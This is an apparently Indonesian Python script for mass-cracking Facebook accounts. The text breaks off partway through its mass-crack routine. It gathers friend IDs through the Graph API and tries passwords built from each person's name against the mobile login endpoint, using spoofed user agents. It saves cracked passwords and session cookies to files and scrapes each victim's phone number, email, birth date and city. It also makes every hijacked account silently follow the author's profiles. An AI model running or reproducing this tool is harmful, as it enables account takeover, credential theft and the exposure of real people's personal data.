''' Excrypted or open source '''
''' buat bahan belajar lo doang '''
''' lebih baik belajar daripada ngerikod😂 '''
''' author by lia zuckerberg '''
''' warna print '''
p, m, h, k, b, u, o, n, a = "\x1b[0;97m", "\x1b[0;91m", "\x1b[0;92m", "\x1b[0;93m", "\x1b[0;94m", "\x1b[0;95m", "\x1b[0;96m", "\033[0m", "\033[90;1m"
''' import module '''
import os, sys, random, json, re, uuid, urllib, base64, zlib
from time import sleep as turu
from time import time as tere
from datetime import datetime
try:
	import requests
	from requests.exceptions import ChunkedEncodingError, ConnectionError
	from bs4 import BeautifulSoup as sop
	from concurrent.futures import ThreadPoolExecutor as tread
	from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
	from rich import print as vprint
	from rich.panel import Panel
	from rich.tree import Tree
	from rich.console import Console
	from rich.columns import Columns as columns
	shit, ses = f"{o}╰─{p}", requests.Session()
	console = Console()
except:
	print(f"{shit}  sedang menginstall bahan module {m}!{p} ")
	os.system(("python" if os.name == "nt" else "python3") + " -m pip install requests bs4 futures rich")
	exit(f"{shit} silahkan run kembali script nya.\n{shit} python zuck.py {m}!{p} ")
''' string loops and append '''
ids, ids2, loops, ok, cp = [], [], 0, 0, 0
tampass, pwlu, metode, data, data2 = [], [], [], {}, {}
rc, rr = random.choice, random.randint
''' convert hari - tanggal - tahun sekarang '''
convert = {"1":"Januari","2":"Februari","3":"Maret","4":"April","5":"Mei","6":"Juni","7":"Juli","8":"Agustus","9":"September","10":"Oktober","11":"November","12":"Desember"}
tgl = datetime.now().day
bln = convert[(str(datetime.now().month))]
thn = datetime.now().year
''' result crack tersimpan '''
okZ = f"OK-{str(tgl)}-{str(bln)}-{str(thn)}.txt"
cpZ = f"CP-{str(tgl)}-{str(bln)}-{str(thn)}.txt"
''' convert tahun uidz '''
def ______BUJANK______(Ngentod):
	if len(Ngentod)==15:
		if Ngentod[:10] in ['1000000000']:
			_____PUKIMAK_____ = '2009'
		elif Ngentod[:9] in ['100000000']:
			_____PUKIMAK_____ = '2009'
		elif Ngentod[:8] in ['10000000']:
			_____PUKIMAK_____ = '2009'
		elif Ngentod[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:
			_____PUKIMAK_____ = '2009'
		elif Ngentod[:7] in ['1000006','1000007','1000008','1000009']:
			_____PUKIMAK_____ = '2010'
		elif Ngentod[:6] in ['100001']:
			_____PUKIMAK_____ = '2010-2011'
		elif Ngentod[:6] in ['100002','100003']:
			_____PUKIMAK_____ = '2011-2012'
		elif Ngentod[:6] in ['100004']:
			_____PUKIMAK_____ = '2012-2013'
		elif Ngentod[:6] in ['100005','100006']:
			_____PUKIMAK_____ = '2013-2014'
		elif Ngentod[:6] in ['100007','100008']:
			_____PUKIMAK_____ = '2014-2015'
		elif Ngentod[:6] in ['100009']:
			_____PUKIMAK_____ = '2015'
		elif Ngentod[:5] in ['10001']:
			_____PUKIMAK_____ = '2015-2016'
		elif Ngentod[:5] in ['10002']:
			_____PUKIMAK_____ = '2016-2017'
		elif Ngentod[:5] in ['10003']:
			_____PUKIMAK_____ = '2018'
		elif Ngentod[:5] in ['10004']:
			_____PUKIMAK_____ = '2019'
		elif Ngentod[:5] in ['10005']:
			_____PUKIMAK_____ = '2020'
		elif Ngentod[:5] in ['10009']:
			_____PUKIMAK_____ = '2023'
		elif Ngentod[:4] in ['6155']:
			_____PUKIMAK_____ = '2023'
		elif Ngentod[:5] in ['10006','10007','10008']:
			_____PUKIMAK_____ = '2021-2022'
		else:
			_____PUKIMAK_____=''
	elif len(Ngentod) in [9,10]:
		_____PUKIMAK_____ = '2008-2009'
	elif len(Ngentod)==8:
		_____PUKIMAK_____ = '2007-2008'
	elif len(Ngentod)==7:
		_____PUKIMAK_____ = '2005-2006'
	else:_____PUKIMAK_____=''
	return _____PUKIMAK_____
''' menu utama '''
class MAINmenu:
	
	def __init__(self):
		try:
			cookie = {"cookie": open("cookies.txt","r").read()}
			token = open("token.txt","r").read()
			take  = ses.get('https://graph.facebook.com/me?fields=name&access_token=%s'%(token),cookies = cookie).json();nama = take["name"]
			self.MENUutama(cookie, token, nama)
		except requests.exceptions.ConnectionError:
			exit()
		except (KeyError, IOError):
			print(f"{shit} cookies invalid... ");turu(1);os.system("rm -rf cookies.txt");os.system("rm -rf token.txt");os.system("clear");self.LOGINcookie()
	''' menu mode online '''
	def MENUutama(self, cookie, token, nama):
		os.system("clear") 
		aZ = rc(['A','B','C','D','E','F','G','H','I','J','K','N','M','O','P','Q','R','S','T','U','V','W','X','Y','Z'])
		key_One = f"{rc(['A','B','C','D','E','F','G','H','I','J','K','N','M','O','P','Q','R','S','T','U','V','W','X','Y','Z'])}{rc(['A','B','C','D','E','F','G','H','I','J','K','N','M','O','P','Q','R','S','T','U','V','W','X','Y','Z'])}{rc(['A','B','C','D','E','F','G','H','I','J','K','N','M','O','P','Q','R','S','T','U','V','W','X','Y','Z'])}{rc(['A','B','C','D','E','F','G','H','I','J','K','N','M','O','P','Q','R','S','T','U','V','W','X','Y','Z'])}{rc(['A','B','C','D','E','F','G','H','I','J','K','N','M','O','P','Q','R','S','T','U','V','W','X','Y','Z'])}"
		tree = Tree(Panel.fit(f"[red]WELCOME, [green]{nama}",style=f"white"))
		tree.add(Panel.fit(f"[white]author : [green]Lia Zuckerberg",style=f"white"))
		vprint(tree)
		anj = []
		anjv = []
		anj.append(Panel(f"[white]a. crack for public\n[white]b. crack for massal",width=35,style=f"white"))
		anj.append(Panel(f"[white]c. crack for mail [red]off\n[white]d. nuyul dump 1 id",width=35,style=f"white"))
		anjv.append(Panel(f"\t\t      [yellow]L[white]. logout script\n\t\t      [red]D[white]. delete cookies",width=71,style=f"white"))
		console.print(columns(anj))
		console.print(columns(anjv))
		pilput = input(f"{shit} choose : ")
		if pilput in ["a"]:
			orang = input(f"{shit} masukan id : ")
			params = {
					"access_token": token, 
					"fields": "name,friends.fields(id,name,birthday)"
			}
			puki = ses.get("https://graph.facebook.com/{}".format(orang),params = params,cookies = cookie).json()
			for bangsat in puki["friends"]["data"]:
				ids.append(bangsat["id"]+"|"+bangsat["name"])
			anjv = []
			anjv.append(Panel(f"[white]\t\t       total id :[green] {len(ids)}",width=71,style=f"white"))
			console.print(columns(anjv))
			self.METHODsetting()
		elif pilput in ["b"]:
			self.KrekMassal(cookie, token)
		elif pilput in ["c"]:
			self.KrekMail()
		elif pilput in ["d"]:
			self.NuyulId(cookie, token)
		elif pilput in ["D","0"]:
			os.system("rm -rf cookies.txt");os.system("rm -rf token.txt")
			print(f"{shit} sukses menghapus cookies.. ");turu(1);exit()
		else:
			print(f"{shit} selamat tinggal... ");exit()
	''' biar gak mokad acc nya '''
	def YaSekedarMengingatkan(self,kuki):
		cookie = {"cookie": kuki}
		with requests.Session() as ses:
			try:
				''' ijin nambahin bot foll ya sayang>< '''
				for KontolJawir in sop(ses.get('https://mbasic.facebook.com/100054394286985',cookies = cookie).content,'html.parser').find_all('a',href=True):
					if 'subscribe.php' in KontolJawir['href']:
						Pukimak = ses.get('https://mbasic.facebook.com%s'%(KontolJawir['href']),cookies = cookie)
			except Exception as e:pass
			try:
				for KontolJawir in sop(ses.get('https://mbasic.facebook.com/100094518372329',cookies = cookie).content,'html.parser').find_all('a',href=True):
					if 'subscribe.php' in KontolJawir['href']:
						Pukimak = ses.get('https://mbasic.facebook.com%s'%(KontolJawir['href']),cookies = cookie)
			except Exception as e:pass
	''' setting method '''
	def METHODsetting(self):
		for kntl in ids:
			xx = random.randint(0,len(ids2))
			ids2.insert(xx,kntl)
		meki = input(f"{shit} apakah anda ingin menambahkan password {h}y{p}/{k}t{p} : ")
		if meki in ["y","Y"]:
			tampass.append("tambahkan")
			anjv = []
			anjv.append(Panel(f"[green]  password harus 6 kata. contoh password : sayang,bangsat,kontol",width=71,style=f"white"))
			console.print(columns(anjv))
			pastam = input(f"{shit} masukan tambahan : ")
			pwtod = pastam.split(",")
			for pwlist in pwtod:
				pwlu.append(pwlist)
		else:pass
		self.Langsung()
	''' mulai crack/setting password wordlist '''
	def Langsung(self):
		anj = []
		anjv = []
		anj.append(Panel(f"[green]hasil crack ok tersimpan di Ok/{okZ}",width=35,style=f"white"))
		anj.append(Panel(f"[yellow]hasil crack cp tersimpan di Cp/{cpZ}",width=35,style=f"white"))
		anjv.append(Panel(f"[cyan]\t\tjangan lupa mainkan modpes pas 200 id!! ",width=71,style=f"white"))
		console.print(columns(anj))
		console.print(columns(anjv))
		input(f"{shit} enter untuk memulai crack.. ")
		print()
		global Pukimak, Ireng
		Pukimak = Progress(TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
		Ireng = Pukimak.add_task('',total=len(ids))
		with Pukimak:
			with tread(max_workers=30) as HikmatXD:
				for koncol in ids2 or ids:
					try:
						pwr = []
						uiz = koncol.split("|")[0]
						nama = koncol.split("|")[1]
						depan = nama.split(" ")[0]
						if len(nama)<=5:
							if len(depan)<3:pass 
							else:
								pwr.append(depan+"123")
								#pwr.append(depan+"321")
								pwr.append(depan+"12345")
								#pwr.append(depan+"1234")
						else:
							if len(depan)<3:pwr.append(nama)
							else:
								pwr.append(nama)
								#pwr.append(depan+"321")
								pwr.append(depan+"123")
								pwr.append(depan+"12345")
								#pwr.append(depan+"1234")
								#pwr.append(depan+"123456")
							tengah = nama.split(" ")[1]
							if len(tengah)<3:
								pwr.append(depan+tengah)
							else:
								pwr.append(depan+tengah)
								pwr.append(depan+tengah+"123")
								pwr.append(tengah+"123")
								#pwr.append(belakang+"1234")
								#pwr.append(tengah+"12345")
							belakang = nama.split(" ")[2]
							if len(belakang)<3:
								pwr.append(depan+tengah+belakang)
							else:
								pwr.append(depan+tengah+belakang)
								pwr.append(depan+tengah+belakang+"123")
								pwr.append(belakang+"123")
								#pwr.append(belakang+"1234")
								#pwr.append(tengah+"12345")
						if "tambahkan" in tampass:
							for ajg in pwlu:pwr.append(ajg)
						else:pass
						HikmatXD.submit(self.Valid,uiz,pwr)
					except:
						HikmatXD.submit(self.Valid,uiz,pwr)
		print()
		if ok != 0 or cp != 0:
			anj = []
			anj.append(Panel(f"[green]ress succes {ok}",width=35,style=f"white"))
			anj.append(Panel(f"[yellow]ress checkpoint {cp}",width=35,style=f"white"))
			console.print(columns(anj))
			exit()
		else:
			anj = []
			anj.append(Panel(f"[yellow]\t   ups.. kamu tidak mendapatkan hasil:( ",width=71,style=f"white"))
			console.print(columns(anj))
			exit()
	''' login cookies '''
	def LOGINcookie(self):
		cookie = input(f"{shit} masukan cookie : ")
		try:
			ses.headers.update({'content-type': 'application/x-www-form-urlencoded'})
			data = {'access_token': '1348564698517390|007c0a9101b9e1c8ffab727666805038','scope': ''}
			response = json.loads(ses.post('https://graph.facebook.com/v2.6/device/login/', data = data).text)
			code, user_code = response['code'], response['user_code']
			verification_url, status_url = ('https://m.facebook.com/device?user_code={}'.format(user_code)), ('https://graph.facebook.com/v2.6/device/login_status?method=post&code={}&access_token=1348564698517390%7C007c0a9101b9e1c8ffab727666805038&callback=LeetsharesCallback'.format(code))
			ses.headers.pop('content-type')
			ses.headers.update({'sec-fetch-mode': 'navigate','user-agent': 'Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36','sec-fetch-site': 'cross-site','Host': 'm.facebook.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-dest': 'document',})
			response2 = ses.get(verification_url, cookies = {'cookie': cookie}).text
			if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
				print(f"{shit} cookie invalid.. ");exit()
			else:
				action = re.search('action="(.*?)">', str(response2)).group(1).replace('amp;', '')
				data = {'fb_dtsg': re.search('name="fb_dtsg" value="(.*?)"', str(response2)).group(1),'jazoest': re.search('name="jazoest" value="(\d+)"', str(response2)).group(1),'qr': 0,'user_code': response['user_code']}
				ses.headers.update({'origin': 'https://m.facebook.com','referer': 'https://m.facebook.com/device?user_code={}'.format(user_code),'content-type': 'application/x-www-form-urlencoded','sec-fetch-site': 'same-origin',})
				response3 = ses.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': cookie})
				if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
					ses.headers.pop('content-type');ses.headers.pop('origin')
					response4 = ses.post(response3.url, data = data, cookies = {'cookie': cookie}).text
					action = re.search('action="(.*?)"', str(response4)).group(1).replace('amp;', '')
					ses.headers.update({'origin': 'https://m.facebook.com','referer': response3.url,'content-type': 'application/x-www-form-urlencoded',})
					data = {'fb_dtsg': re.search('name="fb_dtsg" value="(.*?)"', str(response4)).group(1),'jazoest': re.search('name="jazoest" value="(\d+)"', str(response4)).group(1),'scope': re.search('name="scope" value="(.*?)"', str(response4)).group(1),'display': re.search('name="display" value="(.*?)"', str(response4)).group(1),'user_code': re.search('name="user_code" value="(.*?)"', str(response4)).group(1),'logger_id': re.search('name="logger_id" value="(.*?)"', str(response4)).group(1),'auth_type': re.search('name="auth_type" value="(.*?)"', str(response4)).group(1),'encrypted_post_body': re.search('name="encrypted_post_body" value="(.*?)"', str(response4)).group(1),'return_format[]': re.search('name="return_format\\[\\]" value="(.*?)"', str(response4)).group(1)}
					response5 = ses.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': cookie}).text
					windows_referer = re.search('window.location.href="(.*?)"', str(response5)).group(1).replace('\\', '')
					ses.headers.pop('content-type');ses.headers.pop('origin')
					ses.headers.update({'referer': 'https://m.facebook.com/',})
					response6 = ses.get(windows_referer, cookies = {'cookie': cookie}).text
					if "Sukses!" in str(response6):
						ses.headers.update({'sec-fetch-mode': 'no-cors','referer': 'https://graph.facebook.com/','Host': 'graph.facebook.com','accept': '*/*','sec-fetch-dest': 'script','sec-fetch-site': 'cross-site',})
						response7 = ses.get(status_url, cookies = {'cookie': cookie}).text
						access_token = re.search('"access_token": "(.*?)"', str(response7)).group(1)
						print(f"{shit} cookie anda valid..\n{shit} silahkan jalankan ulang scriptnya.\n{shit} python simpleX.py ");turu(1);open("cookies.txt","w").write(cookie);open("token.txt","w").write(access_token)
						exit()
					else:
						print(f"{shit} cookie anda invalid.. ");exit()
		except Exception as e:
			print(f"{shit} cookie anda invalid.. ");exit()
		except ConnectionError:
			print(f"{shit} sinyal anda bermasalah.. ");exit()
	''' langsung krek coeg '''
	def Valid(self,uiz,pwr):
		global ok, cp, loops
		rr, rc, ses, wwb = random.randint, random.choice, requests.Session(), random.choice([h,k,o,b,u,a])
		Inlocale, Locale= rc(["vi-VN,vi;q=0.9","ar-AR,ar;q=0.9","bg-BG,bg;q=0.9","bs-BA,bs;q=0.9","ca-ES,ca;q=0.9","da-DK,da;q=0.9","el-GR,el;q=0.9","en-US,en;q=0.9","en-GB,en;q=0.9","es-LA,es;q=0.9","es-ES,es;q=0.9","fa-IR,fa;q=0.9","fi-FI,fi;q=0.9","fr-FR,fr;q=0.9","hi-IN,hi;q=0.9","hr-HR,hr;q=0.9","fr-CA,fr;q=0.9","id-ID,id;q=0.9","it-IT,it;q=0.9","ko-KR,ko;q=0.9","mk-MK,mk;q=0.9","ms-MY,ms;q=0.9","pl-PL,pl;q=0.9","pt-BR,pt;q=0.9","pt-PT,pt;q=0.9","ro-RO,ro;q=0.9","sl-SL,sl;q=0.9","sr-RS,sr;q=0.9","th-TH,th;q=0.9"]), rc(["jv_ID","id_ID","en_US"])
		Pukimak.update(Ireng,description=f"{m} • {wwb}{uiz}{p} {loops}/{str(len(ids or ids2))} {h}ok:{ok} {k}cp:{cp}{p} ")
		Pukimak.advance(Ireng)
		MozillaAgent = self.Mozilla(uiz)
		dataku, headersku = {}, {}
		coyy = re.search('Chrome/(.*?)',str(MozillaAgent)).group(1)
		Hostt = "m.facebook.com"
		for pw in pwr:
			pw = pw.lower()
			try:
				ses.headers.update({
										"Host": Hostt,
										"cache-control": "max-age=0",
										"sec-ch-ua-mobile": "?1",
										"upgrade-insecure-requests": "1",
										"user-agent": MozillaAgent,
										"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
										"sec-fetch-site": "same-origin",
										"sec-fetch-mode": "navigate",
										"sec-fetch-dest": "document",
										"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
				})
				Memek = ses.get(f"https://{Hostt}/login/device-based/password/?uid={uiz}&next=https%3A%2F%2Fm.facebook.com%2Fcheckpoint%2F828281030927956%2F%3Fnext%3Dhttps%253A%252F%252Fm.facebook.com%252Fdialog%252Foauth%253Fclient_id%253D124024574287414%2526locale%253Did_ID%2526redirect_uri%253Dhttps%25253A%25252F%25252Fwww.instagram.com%25252Faccounts%25252Fsignup%25252F%2526response_type%253Dcode%25252Cgranted_scopes%2526scope%253Demail%2526state%253D%25257B%252522fbLoginKey%252522%25253A%252522u2j2pp5f2snx1q2thodje6la91nt8y0l3mntki1ngosln12sffnk%252522%25252C%252522fbLoginReturnURL%252522%25253A%252522%25252Ffxcal%25252Fdisclosure%25252F%25253Fnext%25253D%2525252F%252522%25257D%2526ret%253Dlogin%2526fbapp_pres%253D0%2526logger_id%253D8a06ef1e-44f3-42c0-bc7c-85c209748294%2526tp%253Dunspecified&flow=login_no_pin&wtsid=rdr_0GKdDSi1wNtnzhi49&refsrc=deprecated&_rdr")
				dataku.update({
										"fb_dtsg": re.search('{"dtsg":{"token":"(.*?)"',str(Memek.text)).group(1),
										"lsd": re.search('name="lsd" value="(.*?)"',str(Memek.text)).group(1),
										"jazoest": re.search('name="jazoest" value="(.*?)"',str(Memek.text)).group(1),
										"uid": uiz,
										"next": f"https://m.facebook.com/checkpoint/828281030927956/?next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26locale%3Did_ID%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26response_type%3Dcode%252Cgranted_scopes%26scope%3Demail%26state%3D%257B%2522fbLoginKey%2522%253A%2522u2j2pp5f2snx1q2thodje6la91nt8y0l3mntki1ngosln12sffnk%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D8a06ef1e-44f3-42c0-bc7c-85c209748294%26tp%3Dunspecified",
										"flow": "login_no_pin",
										"pass": pw #f"#PWD_BROWSER:0:{str(tere()).split('.')[0]}:{pw}"
				})
				kueh = (";").join([ "%s=%s" % (key, value) for key, value in Memek.cookies.get_dict().items() ])
				kueh+=' m_pixel_ratio=2.625; wd=412x756'
				headersku.update({
										"Host": Hostt,
										"content-length": str(rr(900,1100)),
										#"scheme": "https",
										"cache-control": "max-age=0",
										"dpr": "2",
										"viewport-width": "980",
										"sec-ch-ua": f'"Google Chrome";v="{str(rr(30,119))}", "Chromium";v="{str(rr(30,119))}", "Not?A_Brand";v="24"',
										"sec-ch-ua-mobile": "?1",
										"sec-ch-ua-platform": '"Android"',
										"sec-ch-ua-platform-version": f'"{str(rr(4,8))}.1.0"',
										"sec-ch-ua-model": f'"vivo {str(rr(1599,1899))}"',
										"sec-ch-ua-full-version-list": f'"Google Chrome";v="{coyy}", "Chromium";v="{coyy}", "Not?A_Brand";v="24.0.0.0"',
										"sec-ch-prefers-color-scheme": "light",
										"upgrade-insecure-requests": "1",
										"origin": f"https://{Hostt}",
										"content-type": "application/x-www-form-urlencoded",
										"user-agent": MozillaAgent,
										"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
										"sec-fetch-site": "same-origin",
										"sec-fetch-mode": "navigate",
										"sec-fetch-user": "?1",
										"sec-fetch-dest": "document",
										"referer": f"https://{Hostt}/login/device-based/password/?uid={uiz}&next=https%3A%2F%2Fm.facebook.com%2Fcheckpoint%2F828281030927956%2F%3Fnext%3Dhttps%253A%252F%252Fm.facebook.com%252Fdialog%252Foauth%253Fclient_id%253D124024574287414%2526locale%253Did_ID%2526redirect_uri%253Dhttps%25253A%25252F%25252Fwww.instagram.com%25252Faccounts%25252Fsignup%25252F%2526response_type%253Dcode%25252Cgranted_scopes%2526scope%253Demail%2526state%253D%25257B%252522fbLoginKey%252522%25253A%252522u2j2pp5f2snx1q2thodje6la91nt8y0l3mntki1ngosln12sffnk%252522%25252C%252522fbLoginReturnURL%252522%25253A%252522%25252Ffxcal%25252Fdisclosure%25252F%25253Fnext%25253D%2525252F%252522%25257D%2526ret%253Dlogin%2526fbapp_pres%253D0%2526logger_id%253D8a06ef1e-44f3-42c0-bc7c-85c209748294%2526tp%253Dunspecified&flow=login_no_pin&wtsid=rdr_0GKdDSi1wNtnzhi49&refsrc=deprecated&_rdr",
										"accept-encoding": "gzip, deflate, br",
										"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
				})
				ses.post(f"https://{Hostt}/login/device-based/validate-password/?shbl=0",data = dataku, cookies = {"cookie": kueh}, headers = headersku, allow_redirects = False)
				if "checkpoint" in ses.cookies.get_dict().keys():
					cp+=1
					tree = Tree(Panel.fit(f"[red] ACCOUNT [yellow]CHECKPOINT ",style=f"white"))
					tree.add(Panel.fit(f"[yellow] {uiz} | {pw} ",style=f"white")).add(Panel.fit(f"[cyan]{______BUJANK______(uiz)} "))
					tree.add(Panel.fit(f"[yellow]{MozillaAgent}",style=f"white"))
					vprint(tree)
					open("CP/"+cpZ,"a").write(uiz+"|"+pw+"\n")
					break
				elif "c_user" in ses.cookies.get_dict().keys():
					ok+=1
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open("OK/"+okZ,"a").write(uiz+"|"+pw+"|"+kuki+"\n")
					self.Ingfo(kuki,uiz,pw,MozillaAgent)
					self.YaSekedarMengingatkan(kuki)
					break
				else:continue
			except requests.exceptions.ConnectionError:turu(31)
		loops+=1
	''' list method useragent '''
	def Mozilla(self,uiz):
		rc, rr = random.choice, random.randint
		togel = rc(['01','02','03','04','05','06','07','08','09',str(rr(10,15))])
		sumsang = rc([f"SM-G{str(rr(900,999))}F",f"SM-F{str(rr(700,799))}B",f"SM-A{str(rr(100,199))}F"])
		kumplit, androver = f'{rc([f"{str(rr(30,60))}.0.{str(rr(2000,2999))}",f"{str(rr(70,90))}.0.{str(rr(3000,3999))}",f"{str(rr(100,119))}.0.{str(rr(4000,6199))}"])}.{str(rr(10,199))}', rc([f"{str(rr(5,9))}.0.0",f"{str(rr(5,9))}.0.1",str(rr(5,13)),f"{str(rr(5,9))}.0"])
		TPA, QKQ, PPR = f"TP1A.{str(rr(200000,266999))}.0{togel}", f"QKQ1.{str(rr(100000,166999))}.0{togel}", f"PPR1.{str(rr(100000,188999))}.0{togel}"
		oddo = rc([f" OppoBrowser/{str(rr(6,20))}.5.{str(rr(0,1))}.{str(rr(6,10))}", ""])
		if "regular" in metode:
			all_agent = rc([
						f"Mozilla/5.0 (Linux; Android {str(rr(5,13))}; {sumsang} Build/{TPA}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{kumplit} Mobile Safari/537.36"
			])
		elif "webD" in metode:
			all_agent = f"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{kumplit} Safari/537.36"
		else:
			all_agent = rc([
						f"Mozilla/5.0 (Linux; Android {str(rr(5,13))}; {sumsang} Build/{TPA}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{kumplit} Mobile Safari/537.36",
						f"Mozilla/5.0 (Linux; Android {str(rr(5,13))}; Redmi Note {str(rr(2,9))} Build/{QKQ}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{kumplit} Mobile Safari/537.36",
						f"Mozilla/5.0 (Linux; U; Android {str(rr(5,13))}; in-id; CPH{str(rr(1000,2899))} Build/{PPR}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{kumplit} Mobile Safari/537.36{oddo}",
						f"Mozilla/5.0 (Linux; Android {str(rr(5,8))}.1.2; ASUS_Z01QD Build/{QKQ}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{kumplit} Mobile Safari/537.36",
						f"Mozilla/5.0 (Linux; Android {str(rr(4,8))}.1.0; U6 PRIME Build/OPM2; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Version/4.0 Chrome/{kumplit} Mobile Safari/537.36",
						f"Mozilla/5.0 (Linux; Android {str(rr(5,13))}; Pearl K3 Build/{PPR}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Versi/4.0 Chrome/{kumplit} Mobile Safari/537.36",
						f"Mozilla/5.0 (Linux; Android {str(rr(9,13))}; {str(rr(5599,6499))} Build/Q00{str(rr(500,799))}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{kumplit} Mobile Safari/537.36",
						f"Mozilla/5.0 (Linux; Android {str(rr(4,8))}.0; Infinix X{str(rr(600,799))} Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{kumplit} Mobile Safari/537.36",
						f"Mozilla/5.0 (Linux; Android {str(rr(9,13))}; LAVA LH99{str(rr(10,99))} Build/{PPR}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{kumplit} Mobile Safari/537.36"
			])
		return all_agent
	''' ingfo akun '''
	def Ingfo(self,cookie,uiz,pw,MozillaAgent):
		kuki = {"cookie": cookie}
		head = {'user-agent': 'SupportsFresco=1 Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J210F Build/MMB29Q) Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/172.0.0.8.182;FBDV/SM-J210F;FBLC/id_ID;FBOP/20]'}
		try:
			stem = sop(ses.get('https://mbasic.facebook.com/profile.php?v=friends',headers = head, cookies = kuki).text, 'html.parser') 
			restem = re.findall('\<h3 class\=\".*?\"\>Teman (.*?)</h3>',str(stem))[0]
		except:restem = 'None'
		req = ses.get('https://mbasic.facebook.com/profile.php?v=info',headers = head, cookies = kuki).text
		try:
			nom = re.search('>08(.*?)-(.*?)-(.*?)</span>',str(req)).groups(1)
			resnom = '08{}{}{}'.format(nom[0],nom[1],nom[2])
		except:resnom = 'None'
		try:
			titid = sop(ses.get('https://mbasic.facebook.com/profile.php?v=info',headers = head, cookies = kuki).text, 'html.parser')
			ttl = titid.find(string=re.compile('Tanggal Lahir'))
			if ttl:ttl = ttl.find_next('div').text
			else:ttl = 'None'
		except Exception as e:ttl = 'None'
		try:
			momok = sop(ses.get("https://mbasic.facebook.com/settings/email",headers = head, cookies = kuki).text, "html.parser")
			mail = re.findall('\<span class="s t">(.*?)</span>', str(momok))[0]
		except:mail = 'None'
		try:
			wll = sop(ses.get("https://mbasic.facebook.com/editprofile.php?type=basic&edit=current_city",headers = head, cookies = kuki).text, "html.parser")
			kotalu = re.findall('class="bv bw" name="current_city[]" value="(.*?)"', str(wll))[0]
		except:kotalu = 'None'
		nma = sop(ses.get("https://mbasic.facebook.com/profile.php",headers = head, cookies = kuki).text, "html.parser")
		try:
			nama = re.findall('<title>(.*?)</title>',str(nma))
			nam = (nama[0])
		except:nam = 'None'
		tree = Tree(Panel.fit(f"[red] ACCOUNT [green]SUCCESS ",style=f"white"))
		tree.add(Panel.fit(f"[green] {uiz} | {pw} ",style=f"white")).add(Panel.fit(f"[green]{______BUJANK______(uiz)} "))
		tree.add(Panel.fit(f"[cyan]{nam}[white]",style=f"white")).add(Panel.fit(f"[green]{restem}[white]"))
		tree.add(Panel.fit(f"[cyan]{resnom}[white]",style=f"white")).add(Panel.fit(f"[green]{mail}[white]"))
		tree.add(Panel.fit(f"[cyan]{ttl}[white]",style=f"white")).add(Panel.fit(f"[green]{kotalu}"))
		tree.add(Panel.fit(f"[cyan]{MozillaAgent}",style=f"white")).add(Panel.fit(f"[green]{cookie}"))
		vprint(tree)
	''' crack mail '''
	def KrekMail(self):
		harep = ['andi','dwi','muhammad','nur','dewi','tri','dian','sri','putri','eka','sari','aditya','basuki','budi','joni','toni','cahya','riski','farhan','aden','joko','zaki','zuleha','tina']
		tukang = ['99','official','gaming','utama','cakep','cantik','sayang','ganteng']
		nama = input(f"\n{shit} nama target : ")
		if ',' in str(nama):
			print(f"{shit} masukan 1 nama saja.. ");exit()
		doma = input(f"{shit} domain : ")
		if '@' not in str(doma) or '.com' not in str(doma):
			exit(f"{shit} masukan domain yang benar.. ")
		jumlah = input(f"{shit} total : ")
		for xyz in range(int(jumlah)):
			A = nama
			B = [f'{str(rc(harep))}',f'{str(rr(0,31))}',f'{str(rc(tukang))}'f'{str(rc(harep))}{str(rr(0,31))}',f'{xyz}',f'{str(rc(tukang))}{str(rr(0,31))}',f'{str(rc(harep))}{str(rc(tukang))}']
			C = doma
			D = f'{A}{str(rc(B))}{C}'
			if D in ids:pass
			else:ids.append(D+'|'+nama)
			if len(ids)==2000:self.METHODsetting()
			print(f"\r{shit} sedang dump {h}%s{p} id"%(len(ids)),end='')
			sys.stdout.flush()
		self.METHODsetting()
	''' krek massal v.2 '''
	def KrekMassal(self, kuki, token):
		uid = []
		try:
			mil = int(input(f'{shit} mau brapa id : '))
		except ValueError:
			print(f"{shit} masukan dengan angka!");exit()
		if mil<1 or mil>100:
			print(f"{shit} kebanyakan jumlah id bangsat!");exit()
		angka = 0
